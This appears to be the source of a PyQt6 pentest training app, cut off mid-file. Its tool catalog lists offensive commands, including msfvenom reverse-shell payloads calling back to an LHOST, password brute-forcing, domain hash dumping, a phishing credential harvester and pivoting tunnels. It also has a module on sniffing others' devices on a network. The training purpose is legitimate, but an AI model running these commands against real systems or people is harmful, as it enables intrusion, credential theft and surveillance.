import ipaddress
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import time
from pathlib import Path

from PyQt6.QtCore import Qt, QProcess, QTimer, QUrl
from PyQt6.QtGui import QBrush, QColor, QIcon, QFont, QTextCursor
from PyQt6.QtWidgets import (
    QApplication,
    QCheckBox,
    QFrame,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QListWidget,
    QListWidgetItem,
    QMainWindow,
    QPlainTextEdit,
    QPushButton,
    QScrollArea,
    QStackedWidget,
    QTabWidget,
    QTextBrowser,
    QVBoxLayout,
    QWidget,
)

ROOT = Path(__file__).parent

BLACK = "#000000"
PANEL = "#0a0a0a"
EDGE = "#1e1e1e"
TEXT = "#d4d4d4"
MUTED = "#6b6b6b"
NEON = "#00e5ff"
NEON2 = "#a855f7"

SEV_INFO = "#58a6ff"   # watch / baseline
SEV_LOW = "#3fb950"    # low
SEV_MED = "#d29922"    # medium / elevated
SEV_HIGH = "#f0883e"   # high
SEV_CRIT = "#ff5370"   # critical

STYLE = f"""
QMainWindow, QWidget#root {{
    background: {BLACK};
    color: {TEXT};
}}
QLabel {{
    color: {TEXT};
    background: transparent;
}}
QLabel#title {{
    color: {NEON};
    font-size: 22px;
    font-weight: bold;
    letter-spacing: 6px;
}}
QLabel#sub {{
    color: {MUTED};
    font-size: 11px;
    letter-spacing: 2px;
}}
QLabel#accent {{
    color: {NEON};
}}
QFrame#header {{
    background: {BLACK};
    border-bottom: 1px solid {EDGE};
}}
QTabWidget::pane {{
    border: 1px solid {EDGE};
    background: {PANEL};
    top: -1px;
}}
QTabBar::tab {{
    background: {BLACK};
    color: {MUTED};
    padding: 10px 22px;
    margin-right: 1px;
    border: 1px solid {EDGE};
    border-bottom: none;
    font-size: 12px;
    letter-spacing: 2px;
    text-transform: uppercase;
}}
QTabBar::tab:selected {{
    background: {PANEL};
    color: {NEON};
    border-top: 2px solid {NEON};
}}
QTabBar::tab:hover:!selected {{
    color: {TEXT};
    border-color: {NEON2};
}}
QPlainTextEdit {{
    background: {BLACK};
    color: {TEXT};
    border: 1px solid {EDGE};
    font-family: monospace;
    font-size: 13px;
    padding: 8px;
    selection-background-color: {NEON2};
}}
QLabel#placeholder {{
    color: {MUTED};
    font-size: 14px;
}}
QLabel#task {{
    color: {NEON2};
    font-size: 13px;
    background: {BLACK};
    border: 1px solid {NEON2};
    padding: 8px 12px;
}}
QLabel#toolname {{
    color: {NEON};
    font-size: 15px;
    font-weight: bold;
    letter-spacing: 3px;
}}
QLabel#tooldesc {{
    color: {TEXT};
    font-size: 13px;
}}
QListWidget {{
    background: {BLACK};
    color: {TEXT};
    border: 1px solid {EDGE};
    font-size: 13px;
    padding: 4px;
}}
QListWidget::item {{
    padding: 9px 10px;
    border-bottom: 1px solid {EDGE};
}}
QListWidget::item:selected {{
    background: {BLACK};
    color: {NEON};
    border-left: 2px solid {NEON};
}}
QListWidget::item:hover {{
    color: {NEON2};
}}
QLineEdit {{
    background: {BLACK};
    color: {NEON};
    border: 1px solid {EDGE};
    padding: 9px 10px;
    font-family: monospace;
    font-size: 13px;
    selection-background-color: {NEON2};
}}
QLineEdit:focus {{
    border-color: {NEON};
}}
QPushButton#copy {{
    padding: 4px 12px;
    font-size: 10px;
    letter-spacing: 1px;
}}
QFrame#step {{
    background: {BLACK};
    border: 1px solid {EDGE};
}}
QLabel#steptitle {{
    color: {NEON};
    font-size: 13px;
    font-weight: bold;
    letter-spacing: 2px;
}}
QLabel#goal {{
    color: {TEXT};
    font-size: 14px;
}}
QLabel#cmdline {{
    color: {NEON};
    background: {BLACK};
    border: 1px solid {EDGE};
    padding: 8px 10px;
    font-family: monospace;
    font-size: 12px;
}}
QLabel#expect {{
    color: {TEXT};
    font-size: 12px;
}}
QLabel#watch {{
    color: #ff5370;
    font-size: 12px;
}}
QLabel#section {{
    color: {NEON};
    font-size: 12px;
    font-weight: bold;
    letter-spacing: 3px;
}}
QLabel#chip {{
    color: {NEON2};
    border: 1px solid {NEON2};
    padding: 2px 9px;
    font-size: 10px;
    letter-spacing: 1px;
}}
QScrollArea {{
    border: none;
    background: transparent;
}}
QScrollArea > QWidget > QWidget {{
    background: transparent;
}}
QPushButton {{
    background: {BLACK};
    color: {NEON};
    border: 1px solid {NEON};
    padding: 10px 20px;
    font-size: 12px;
    letter-spacing: 3px;
    font-weight: bold;
}}
QPushButton:hover {{
    background: {NEON};
    color: {BLACK};
}}
QPushButton:pressed {{
    background: {NEON2};
    border-color: {NEON2};
    color: {BLACK};
}}
QPushButton:disabled {{
    color: {MUTED};
    border-color: {EDGE};
    background: {PANEL};
}}
QPushButton:checked {{
    background: {NEON};
    color: {BLACK};
    border-color: {NEON};
}}
QPushButton#ghost {{
    color: {MUTED};
    border-color: {EDGE};
}}
QPushButton#ghost:hover {{
    color: {NEON2};
    border-color: {NEON2};
    background: {BLACK};
}}
QStatusBar {{
    background: {BLACK};
    color: {MUTED};
    border-top: 1px solid {EDGE};
    font-size: 11px;
}}
"""


class Panel(QFrame):
    """A single tab body: black panel with a heading and a body layout."""

    def __init__(self, title, subtitle=""):
        super().__init__()
        self.setObjectName("panel")
        self.setStyleSheet(
            f"QFrame#panel {{ background: {PANEL}; border: none; }}"
        )
        outer = QVBoxLayout(self)
        outer.setContentsMargins(24, 24, 24, 24)
        outer.setSpacing(14)

        head = QVBoxLayout()
        head.setSpacing(2)
        h = QLabel(title)
        h.setObjectName("accent")
        h.setStyleSheet(f"color: {NEON}; font-size: 16px; font-weight: bold; letter-spacing: 3px;")
        head.addWidget(h)
        if subtitle:
            s = QLabel(subtitle)
            s.setObjectName("sub")
            head.addWidget(s)
        outer.addLayout(head)

        self.body = QVBoxLayout()
        self.body.setSpacing(10)
        outer.addLayout(self.body, 1)

    def add(self, widget):
        self.body.addWidget(widget)
        return widget


def placeholder(text):
    lbl = QLabel(text)
    lbl.setObjectName("placeholder")
    lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
    return lbl


RECON_TOOLS = [
    {
        "name": "nmap",
        "bin": "nmap",
        "desc": "Network mapper — host discovery, port scanning, service and OS fingerprinting.",
        "task": "Find open ports and running services on your target.",
        "cmd": "nmap -sV -T4 <target>",
        "examples": ["nmap -sn 192.168.1.0/24", "nmap -sV -O -p- <target>"],
    },
    {
        "name": "whois",
        "bin": "whois",
        "desc": "Query domain registrant data — owner, registrar, nameservers, dates.",
        "task": "Pull registration records for the target domain.",
        "cmd": "whois <target>",
        "examples": ["whois example.com"],
    },
    {
        "name": "dig",
        "bin": "dig",
        "desc": "DNS lookup utility — A, AAAA, MX, NS, TXT and any other record.",
        "task": "Enumerate the domain's DNS records.",
        "cmd": "dig <target> ANY +noall +answer",
        "examples": ["dig example.com MX", "dig -x 8.8.8.8"],
    },
    {
        "name": "host",
        "bin": "host",
        "desc": "Quick DNS resolution utility for lookups and zone transfers.",
        "task": "Resolve the target and try an AXFR zone transfer against its NS.",
        "cmd": "host <target>",
        "examples": ["host -l example.com ns1.example.com"],
    },
    {
        "name": "whatweb",
        "bin": "whatweb",
        "desc": "Web fingerprinting — CMS, frameworks, server versions, plugins, banners.",
        "task": "Fingerprint the target web server and identify its tech stack.",
        "cmd": "whatweb <target>",
        "examples": ["whatweb -v https://example.com"],
    },
    {
        "name": "nikto",
        "bin": "nikto",
        "desc": "Web server scanner — dangerous files, outdated software, misconfigurations.",
        "task": "Run a baseline vulnerability scan against the lab web server.",
        "cmd": "nikto -h <target>",
        "examples": ["nikto -h http://192.168.1.10"],
    },
    {
        "name": "theHarvester",
        "bin": "theHarvester",
        "desc": "OSINT harvesting — emails, subdomains, hosts and employee names.",
        "task": "Collect emails and subdomains for the target domain.",
        "cmd": "theHarvester -d <target> -b all",
        "examples": ["theHarvester -d example.com -b google,bing"],
    },
    {
        "name": "recon-ng",
        "bin": "recon-ng",
        "desc": "Full-featured reconnaissance framework with modules and workspaces.",
        "task": "Create a workspace and run at least one discovery module.",
        "cmd": "recon-ng -w raven",
        "examples": ["recon-ng -w raven"],
    },
    {
        "name": "enum4linux",
        "bin": "enum4linux",
        "desc": "Windows/Samba enumeration — users, shares, groups, policies over SMB.",
        "task": "Enumerate users and shares on a Windows/Samba host.",
        "cmd": "enum4linux -a <target>",
        "examples": ["enum4linux -U -S <target>"],
    },
    {
        "name": "smbclient",
        "bin": "smbclient",
        "desc": "SMB/CIFS client — list and download shares without mounting.",
        "task": "List available shares on the target host.",
        "cmd": "smbclient -L //<target> -N",
        "examples": ["smbclient //<target>/share -N"],
    },
    {
        "name": "dnsrecon",
        "bin": "dnsrecon",
        "desc": "DNS enumeration — standard lookups, zone transfers, brute-forcing.",
        "task": "Enumerate DNS records and attempt a zone transfer.",
        "cmd": "dnsrecon -d <target>",
        "examples": ["dnsrecon -d example.com -t std,zonewalk"],
    },
    {
        "name": "amass",
        "bin": "amass",
        "desc": "Attack-surface mapping — passive and active subdomain discovery.",
        "task": "Discover subdomains of the target domain.",
        "cmd": "amass enum -d <target>",
        "examples": ["amass enum -passive -d example.com"],
    },
    {
        "name": "subfinder",
        "bin": "subfinder",
        "desc": "Passive subdomain discovery from many OSINT sources.",
        "task": "Collect as many subdomains as you can, passively.",
        "cmd": "subfinder -d <target>",
        "examples": ["subfinder -d example.com -silent"],
    },
    {
        "name": "ffuf",
        "bin": "ffuf",
        "desc": "Fast web fuzzer — directories, parameters, virtual hosts, subdomains.",
        "task": "Brute-force hidden directories on the lab web server.",
        "cmd": "ffuf -u <target>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
        "examples": ["ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/dirb/common.txt"],
    },
    {
        "name": "arp-scan",
        "bin": "arp-scan",
        "desc": "Layer-2 discovery — sweep the local LAN via ARP to find live hosts.",
        "task": "Map every live host on your local network segment.",
        "cmd": "arp-scan --localnet",
        "examples": ["arp-scan 192.168.1.0/24"],
    },
    {
        "name": "hydra",
        "bin": "hydra",
        "desc": "Online password brute-forcer for many services (SSH, FTP, HTTP...).",
        "task": "Test the lab service credentials against the wordlist provided.",
        "cmd": "hydra -L users.txt -P passwords.txt <target> ssh",
        "examples": ["hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ssh"],
    },
]


PENTEST_TOOLS = [
    # --- exploitation ---
    {
        "name": "msfconsole",
        "bin": "msfconsole",
        "desc": "Metasploit Framework — the standard exploitation framework: exploits, payloads, sessions, pivoting.",
        "task": "Launch Metasploit, search for an exploit matching your lab target's service, and get a shell.",
        "cmd": "msfconsole -q",
        "examples": ["msfconsole -q -x 'search vsftpd; exit'"],
    },
    {
        "name": "msfvenom",
        "bin": "msfvenom",
        "desc": "Metasploit payload generator — reversed/polymorphic shells, encoders, handlers for every platform.",
        "task": "Generate a payload for your target OS and note the LHOST/LPORT you must handler.",
        "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf",
        "examples": [
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe",
            "msfvenom -p php/reverse_php LHOST=192.168.1.5 LPORT=4444 -f raw > shell.php",
        ],
    },
    {
        "name": "searchsploit",
        "bin": "searchsploit",
        "desc": "Exploit-DB offline search — public exploits for known software versions.",
        "task": "Find a public exploit for a service you fingerprinted in Recon, and check it applies.",
        "cmd": "searchsploit <target>",
        "examples": ["searchsploit vsftpd 2.3.4", "searchsploit -m 49757"],
    },
    {
        "name": "burpsuite",
        "bin": "burpsuite",
        "desc": "Intercepting proxy and web-app testing suite — request tampering, repeater, intruder, decoder.",
        "task": "Proxy a browser through Burp, capture a login request, and replay it modified in Repeater.",
        "cmd": "burpsuite",
        "examples": ["burpsuite --unpacked-app-dir"],
    },
    {
        "name": "sqlmap",
        "bin": "sqlmap",
        "desc": "Automated SQL injection detection and exploitation — DBMS enum, data dump, file read/write, OS shell.",
        "task": "Test a parameterized lab URL for injection and dump one table.",
        "cmd": "sqlmap -u 'http://<target>/page.php?id=1' --batch --dbs",
        "examples": [
            "sqlmap -u 'http://192.168.1.10/page.php?id=1' --batch --technique=BEUST --level=5 --risk=3",
            "sqlmap -r request.txt --batch --os-shell",
        ],
    },
    {
        "name": "wpscan",
        "bin": "wpscan",
        "desc": "WordPress vulnerability scanner — plugins, themes, users, weak passwords.",
        "task": "Enumerate a lab WordPress site: users, plugins and known CVEs.",
        "cmd": "wpscan --url http://<target> --enumerate u,vp,vt",
        "examples": ["wpscan --url http://192.168.1.10 --passwords /usr/share/wordlists/rockyou.txt.gz"],
    },
    {
        "name": "commix",
        "bin": "commix",
        "desc": "Automated OS command injection detection and exploitation.",
        "task": "Test a GET/POST parameter for command injection and get shell output through it.",
        "cmd": "commix -u 'http://<target>/page.php?cmd=ping' --batch",
        "examples": ["commix -u 'http://192.168.1.10/page.php?cmd=ping' --batch --os-cmd='id'"],
    },
    # --- credential attacks ---
    {
        "name": "hydra",
        "bin": "hydra",
        "desc": "Parallel online login cracker — SSH, FTP, HTTP, SMB, RDP and 50+ protocols.",
        "task": "Brute-force a lab service login with a small wordlist and time the attempt.",
        "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz <target> ssh",
        "examples": [
            "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt.gz <target> http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'",
            "hydra -l admin -P pass.txt <target> rdp",
        ],
    },
    {
        "name": "medusa",
        "bin": "medusa",
        "desc": "Modular, highly parallel brute-forcer — same protocols as Hydra, different engine.",
        "task": "Run the same login test with Medusa and compare speed/behavior with Hydra.",
        "cmd": "medusa -h <target> -u admin -P /usr/share/wordlists/rockyou.txt.gz -M ssh",
        "examples": ["medusa -H hosts.txt -U users.txt -P pass.txt -M smbnt"],
    },
    {
        "name": "john",
        "bin": "john",
        "desc": "John the Ripper — offline password hash cracking with wordlist/rules/incremental modes.",
        "task": "Crack a captured hash (e.g. from secretsdump) and identify the format first.",
        "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt.gz hash.txt",
        "examples": ["john --show hash.txt", "john --format=raw-md5 hash.txt"],
    },
    {
        "name": "hashcat",
        "bin": "hashcat",
        "desc": "GPU-accelerated offline hash cracker — the fastest way through big hash sets.",
        "task": "Crack the same hash John cracked, and time both tools against each other.",
        "cmd": "hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt.gz",
        "examples": ["hashcat -m 0 -a 0 hash.txt rockyou.txt.gz", "hashcat --example-hashes"],
    },
    {
        "name": "responder",
        "bin": "responder",
        "desc": "LLMNR/NBT-NS/MDNS poisoner — captures NetNTLM hashes on the local segment.",
        "task": "Run Responder on your lab interface and capture a hash from a victim machine.",
        "cmd": "responder -I <iface> -wrf",
        "examples": ["responder -I eth0 -wrf"],
    },
    # --- Active Directory / post-ex ---
    {
        "name": "netexec",
        "bin": "netexec",
        "desc": "Modern SMB/SSH/WinRM enumeration & post-exploitation (successor to CrackMapExec).",
        "task": "Check SMB signing, enumerate shares and logged-on users across your lab domain.",
        "cmd": "netexec smb <target>",
        "examples": [
            "netexec smb <target> -u admin -p password --shares",
            "netexec ldap <target> -u user -p pass --users",
        ],
    },
    {
        "name": "evil-winrm",
        "bin": "evil-winrm",
        "desc": "The friendliest WinRM shell for post-exploitation — uploads, downloads, in-memory PowerShell.",
        "task": "Get a WinRM session with cracked/domain credentials and read a flag file.",
        "cmd": "evil-winrm -i <target> -u admin -p password",
        "examples": ["evil-winrm -i 192.168.1.10 -u admin -p password -s scripts/"],
    },
    {
        "name": "impacket-secretsdump",
        "bin": "impacket-secretsdump",
        "desc": "Remote/local NTDS.dump — pulls local & domain password hashes (NTLM) from a DC.",
        "task": "Dump domain hashes from the lab DC and crack one with John or Hashcat.",
        "cmd": "impacket-secretsdump <domain>/<user>:<password>@<target>",
        "examples": [
            "impacket-secretsdump -just-dc-user Administrator lab/user:Pass123@10.10.10.5",
            "impacket-secretsdump -sam SAM -system SYSTEM local",
        ],
    },
    {
        "name": "impacket-psexec",
        "bin": "impacket-psexec",
        "desc": "PSEXEC-style remote shell over SMB using Impacket — classic post-exploitation path.",
        "task": "Turn admin credentials into a SYSTEM shell on a Windows host.",
        "cmd": "impacket-psexec <domain>/<user>:<password>@<target>",
        "examples": ["impacket-psexec Administrator:Password@192.168.1.10"],
    },
    {
        "name": "impacket-GetUserSPNs",
        "bin": "impacket-GetUserSPNs",
        "desc": "Kerberoasting — request service tickets for accounts with SPNs and crack them offline.",
        "task": "Request SPN tickets for the domain and crack a service account hash.",
        "cmd": "impacket-GetUserSPNs <domain>/<user>:<password> -request",
        "examples": ["impacket-GetUserSPNs lab/user:Pass123@10.10.10.5 -request -outputfile spn.hashes"],
    },
    {
        "name": "bloodhound-python",
        "bin": "bloodhound-python",
        "desc": "AD attack-path collector — gathers AD data for BloodHound graph analysis.",
        "task": "Collect domain data and find the shortest path to Domain Admin.",
        "cmd": "bloodhound-python -d <domain> -u <user> -p <password> -ns <target> -c All",
        "examples": ["bloodhound-python -d lab.local -u user -p Pass123 -ns 10.10.10.5 -c All"],
    },
    {
        "name": "certipy-ad",
        "bin": "certipy-ad",
        "desc": "Active Directory Certificate Services abuse — misconfigured templates → domain takeover.",
        "task": "Find vulnerable certificate templates on the lab CA and request an enrollable cert.",
        "cmd": "certipy-ad find -u <user>@<domain> -p <password> -vulnerable",
        "examples": ["certipy-ad find -u user@lab.local -p Pass123 -dc-ip 10.10.10.5 -vulnerable"],
    },
    {
        "name": "ldapdomaindump",
        "bin": "ldapdomaindump",
        "desc": "LDAP enumeration — dumps users, groups, policies of a domain for offline review.",
        "task": "Dump the domain via LDAP and identify admin groups and password policies.",
        "cmd": "ldapdomaindump -u '<domain>/<user>' -p <password> <target>",
        "examples": ["ldapdomaindump -u 'lab/user' -p Pass123 10.10.10.5 -o ldap_dump"],
    },
    {
        "name": "smbmap",
        "bin": "smbmap",
        "desc": "SMB share enumerator — lists readable/writable shares and can pull or plant files.",
        "task": "Find a writable share and download interesting files from it.",
        "cmd": "smbmap -H <target>",
        "examples": ["smbmap -H 192.168.1.10 -u guest -p '' -R", "smbmap -H <target> -R -A 'flag'"],
    },
    # --- tunneling / raw ---
    {
        "name": "proxychains4",
        "bin": "proxychains4",
        "desc": "Force any TCP tool through a SOCKS/HTTP proxy — pivot into an isolated network.",
        "task": "Route a scan through your compromised host's proxy to reach the internal network.",
        "cmd": "proxychains4 nmap -sT -Pn <target>",
        "examples": ["proxychains4 curl http://internal.site"],
    },
    {
        "name": "socat",
        "bin": "socat",
        "desc": "Swiss-army knife of sockets — port forwards, relays, reverse shells, TLS tunnels.",
        "task": "Set up a listener and catch the reverse shell from your payload.",
        "cmd": "socat TCP-LISTEN:4444,reuseaddr,fork STDOUT",
        "examples": ["socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80"],
    },
    {
        "name": "r2",
        "bin": "r2",
        "desc": "Radare2 — reverse-engineering framework for binaries: disasm, patch, debug, ROP.",
        "task": "Open a sample binary, find the main function and identify the vulnerable call.",
        "cmd": "r2 -A <binary>",
        "examples": ["r2 -A /bin/ls", "r2 -A -q -c 'pdf @main' /bin/ls"],
    },
    {
        "name": "setoolkit",
        "bin": "setoolkit",
        "desc": "Social-Engineering Toolkit — phishing templates, credential harvester, payload attacks.",
        "task": "Build a credential-harvesting landing page for your authorized phishing lab.",
        "cmd": "setoolkit",
        "examples": ["setoolkit -q"],
    },
    {
        "name": "chisel",
        "bin": "chisel",
        "desc": "Fast TCP/UDP tunnel over HTTP(S) — reverse/forward proxies that survive NAT.",
        "task": "Pivot through a compromised host into an internal-only network.",
        "cmd": "chisel server --reverse --port 8080",
        "examples": ["chisel client 192.168.1.5:8080 R:socks"],
    },
]


class ReconToolPage(QWidget):
    """One tool page: description, student task, editable command, live output."""

    def __init__(self, tool, log, on_running_change, tag="recon"):
        super().__init__()
        self.tool = tool
        self.log = log
        self.tag = tag
        self.on_running_change = on_running_change
        self.proc = QProcess(self)
        self.proc.setProcessChannelMode(QProcess.ProcessChannelMode.MergedChannels)
        self.proc.readyReadStandardOutput.connect(self._drain)
        self.proc.finished.connect(self._finished)

        lay = QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(10)

        head = QHBoxLayout()
        name = QLabel(tool["name"].upper())
        name.setObjectName("toolname")
        head.addWidget(name)
        head.addStretch(1)
        self.status = QLabel("READY")
        self.status.setStyleSheet(
            f"color: {MUTED}; font-size: 11px; letter-spacing: 2px; border: 1px solid {EDGE}; padding: 3px 10px;"
        )
        head.addWidget(self.status)
        lay.addLayout(head)

        desc = QLabel(tool["desc"])
        desc.setObjectName("tooldesc")
        desc.setWordWrap(True)
        lay.addWidget(desc)

        task = QLabel(f"TASK  //  {tool['task']}")
        task.setObjectName("task")
        task.setWordWrap(True)
        lay.addWidget(task)

        cmd_row = QHBoxLayout()
        cmd_row.setSpacing(8)
        self.cmd_edit = QLineEdit(tool["cmd"])
        self.cmd_edit.setPlaceholderText("command — replace <target> with the host/domain to test")
        cmd_row.addWidget(self.cmd_edit, 1)
        self.btn_run = QPushButton("RUN")
        self.btn_run.clicked.connect(self.run)
        cmd_row.addWidget(self.btn_run)
        self.btn_stop = QPushButton("STOP")
        self.btn_stop.setObjectName("ghost")
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self.stop)
        cmd_row.addWidget(self.btn_stop)
        lay.addLayout(cmd_row)

        if tool.get("examples"):
            ex = QLabel("example:  " + "   |   ".join(tool["examples"]))
            ex.setStyleSheet(f"color: {MUTED}; font-size: 11px;")
            ex.setWordWrap(True)
            lay.addWidget(ex)

        self.out = QPlainTextEdit()
        self.out.setReadOnly(True)
        self.out.setPlaceholderText(f"output of {tool['name']} appears here")
        lay.addWidget(self.out, 1)

    @property
    def running(self):
        return self.proc.state() != QProcess.ProcessState.NotRunning

    def run(self):
        if self.running:
            return
        raw = self.cmd_edit.text().strip()
        if not raw:
            return
        if "<target>" in raw:
            self.out.appendPlainText(
                "!! replace <target> with a host or domain you are authorized to test"
            )
            return
        try:
            argv = shlex.split(raw)
        except ValueError as e:
            self.out.appendPlainText(f"!! bad command line: {e}")
            return
        if not shutil.which(argv[0]):
            self.out.appendPlainText(f"!! {argv[0]} not found on this system")
            self.log(f"[{self.tag}] {argv[0]} not found on this system")
            return
        self.out.clear()
        self.out.appendPlainText(f"$ {raw}\n")
        self.status.setText("RUNNING")
        self.status.setStyleSheet(
            f"color: {NEON}; font-size: 11px; letter-spacing: 2px; border: 1px solid {NEON}; padding: 3px 10px;"
        )
        self.btn_run.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.on_running_change(True)
        self.log(f"[{self.tag}] $ {raw}")
        self.proc.start(argv[0], argv[1:])

    def stop(self):
        if self.running:
            self.proc.terminate()
            self.log(f"[{self.tag}] terminated {self.tool['name']}")

    def _drain(self):
        data = bytes(self.proc.readAllStandardOutput()).decode(errors="replace")
        if data:
            self.out.moveCursor(QTextCursor.MoveOperation.End)
            self.out.insertPlainText(data)
            self.out.moveCursor(QTextCursor.MoveOperation.End)

    def _finished(self, code, status):
        self.out.appendPlainText(f"\n[exit {code}]")
        self.status.setText("READY")
        self.status.setStyleSheet(
            f"color: {MUTED}; font-size: 11px; letter-spacing: 2px; border: 1px solid {EDGE}; padding: 3px 10px;"
        )
        self.btn_run.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.on_running_change(False)
        self.log(f"[{self.tag}] {self.tool['name']} exited with code {code}")


class ReconPane(QWidget):
    """Sidebar list of tools + stacked pages, one per tool."""

    def __init__(self, log, report, tools=None, tag="recon"):
        super().__init__()
        self.log = log
        self.report = report
        self.tag = tag
        self.tools = tools if tools is not None else RECON_TOOLS
        self.pages = []

        lay = QHBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(14)

        self.listw = QListWidget()
        self.listw.setFixedWidth(200)
        for tool in self.tools:
            item = QListWidgetItem(tool["name"])
            if not shutil.which(tool["bin"]):
                item.setForeground(QBrush(QColor(MUTED)))
                item.setToolTip(f"{tool['name']} — not found on PATH (install to enable)")
            else:
                item.setToolTip(tool["desc"])
            self.listw.addItem(item)
        self.listw.currentRowChanged.connect(self._show)
        lay.addWidget(self.listw)

        self.stack = QStackedWidget()
        for tool in self.tools:
            page = ReconToolPage(tool, self.log, self._running_changed, tag=self.tag)
            self.pages.append(page)
            self.stack.addWidget(page)
        lay.addWidget(self.stack, 1)

        self.listw.setCurrentRow(0)

    def _show(self, row):
        if row >= 0:
            self.stack.setCurrentIndex(row)

    def _running_changed(self, running):
        if running:
            return
        self.report(f"{self.tag} tool finished — output captured above")


LEARN_MODULES = [
    {
        "name": "RAVEN — Talk to it",
        "goal": "raven speaks plain language. type a command into ASK RAVEN on the Crow tab and it picks the right role, "
                "auto-detects the network you are on, spawns a crow and releases it. copy a command below, paste it "
                "into ASK RAVEN, hit GO.",
        "tools": ["crow tab", "ASK RAVEN", "sniff", "recon", "pentest"],
        "steps": [
            {"title": "All eyes on me — full passive watch",
             "cmd": "all eyes on me",
             "expect": "A SNIFF crow: mdns/SSDP/LLMNR + DNS + TLS-SNI listeners + a saved pcap. everyone on the "
                       "segment gets announced (cast, airplay, spotify), every DNS name it resolves appears, "
                       "cleartext TLS server names surface.",
             "watch": "On your phone's hotspot this includes the phone's OWN traffic. On shared wifi you see the "
                      "segment + broadcasts, not other networks' encrypted flows."},
            {"title": "Who is alive on my network",
             "cmd": "map my network",
             "expect": "A RECON crow against the live subnet: live hosts, top-1000 ports, service versions, "
                       "SMB shares. new device since last map = the thing to chase.",
             "watch": "A brand-new MAC appears right after someone 'loses their phone' — that device is your story."},
            {"title": "Everyone talking right now",
             "cmd": "who is on my network",
             "expect": "Same recon map — arp vendor names make the phone/box/doorbell obvious without guessing MACs.",
             "watch": "Randomized MACs (many smartphones) show as vendor-stringless — correlate by IP lease time."},
            {"title": "Deep-dive a specific box",
             "cmd": "scan 10.0.0.5",
             "expect": "A RECON crow on exactly that target: whois, dns, live check, fingerprint, vuln scripts, "
                       "web dirs, smb — one crow, full picture.",
             "watch": "Run this BEFORE hunting exploits — 90% of findings are version -> searchsploit matches."},
            {"title": "Full pentest pass",
             "cmd": "hack the dmz",
             "expect": "A PENETRATOR crow on the target/subnet: shares, web, payloads, bruteforce attempts — "
                       "all logged with the timings raven records.",
             "watch": "Only on a target you are authorized to touch. scope rules still apply — crows are fast, "
                      "not immune to scope."},
            {"title": "Cast / airplay hunting",
             "cmd": "watch for casting",
             "expect": "SNIFF crow leans into mdns/SSDP so you catch chromecast/apple-tv/spotify announcements — "
                       "device names and 'now playing' labels broadcast in the clear.",
             "watch": "The buy-it-again widget on the TV isn't the lead — the phone polling 'now playing' from the "
                      "same segment is."},
        ],
        "analysis": [
            "Every crow result lands in crow/ with -oA/-w artifacts — the pcap is admissible-ish evidence for the fire. "
            "re-listen any time.",
            "Findings chips under each crow: one click copies the IP/domain into your hands mid-fire.",
            "A yellow 'auto-detected subnet' note means raven guessed the target from the live route — verify it "
            "matches the scope the same way you verify any other finding.",
            "Lives are on the line in incident fires: crows buy the minutes between triage and containment. run a map, "
            "watch the SNI, save the pcap, then run the pentest pass while the clock is still yours.",
        ],
    },
    {
        "name": "A — Scope & Rules",
        "goal": "Define exactly what you may touch before running a single scan. No scope, no test.",
        "tools": ["notes"],
        "steps": [
            {"title": "Write the scope down",
             "cmd": "echo 'TARGETS: <target>  WINDOW: <dates>  CONTACT: <name>' > scope.txt",
             "expect": "A scope.txt in your working directory listing IPs/domains, dates and a contact.",
             "watch": "Anything not listed is OFF LIMITS — including cloud hosts behind the target."},
            {"title": "Confirm authorization in writing",
             "cmd": "cat scope.txt",
             "expect": "The same scope you agreed with the owner.",
             "watch": "'My friend runs this company' is not authorization. Get it signed or emailed."},
        ],
        "analysis": [
            "Report must restate scope verbatim so the reader knows what was and wasn't tested.",
            "If a scan touched an out-of-scope IP, disclose it immediately — accidental escalation is still an incident.",
        ],
    },
    {
        "name": "B — Passive OSINT",
        "goal": "Learn about the target without ever sending a packet to it.",
        "tools": ["whois", "theHarvester", "dig"],
        "steps": [
            {"title": "Registrant records",
             "cmd": "whois <target>",
             "expect": "Registrar, creation/expiry dates, nameservers, sometimes org + email.",
             "watch": "Privacy-shielded WHOIS is normal; harvested emails from other sources matter more."},
            {"title": "Emails, subdomains, hosts",
             "cmd": "theHarvester -d <target> -b all",
             "expect": "Lists of employee emails, subdomains and IP ranges from search engines.",
             "watch": "Stale results — verify every subdomain resolves before using it."},
            {"title": "DNS records without touching the host",
             "cmd": "dig <target> ANY +noall +answer",
             "expect": "A, MX, NS, TXT (SPF/DKIM), CNAME records.",
             "watch": "TXT records often leak third-party services (u-zon, mail providers) = extra attack surface."},
        ],
        "analysis": [
            "Correlate WHOIS org names with LinkedIn to map employees -> phishing targets.",
            "SPF records that use '+all' mean anyone can send mail as the domain — report as a finding.",
        ],
    },
    {
        "name": "C — DNS & Subdomains",
        "goal": "Map the full attack surface: every subdomain that actually resolves.",
        "tools": ["subfinder", "amass", "dnsrecon", "host"],
        "steps": [
            {"title": "Passive subdomain harvest",
             "cmd": "subfinder -d <target> -silent | sort -u > subs.txt",
             "expect": "A deduplicated list of subdomains from dozens of OSINT sources.",
             "watch": "Wildcard DNS makes everything 'resolve' — check with dig before trusting output."},
            {"title": "Zone transfer attempt",
             "cmd": "host -l <target> ns1.<target>",
             "expect": "Usually 'Transfer failed' (good). If it succeeds you get the entire zone.",
             "watch": "A successful AXFR is a critical misconfiguration — document it immediately."},
            {"title": "Active enumeration",
             "cmd": "dnsrecon -d <target> -t std",
             "expect": "Standard record lookups plus NS/SOA info.",
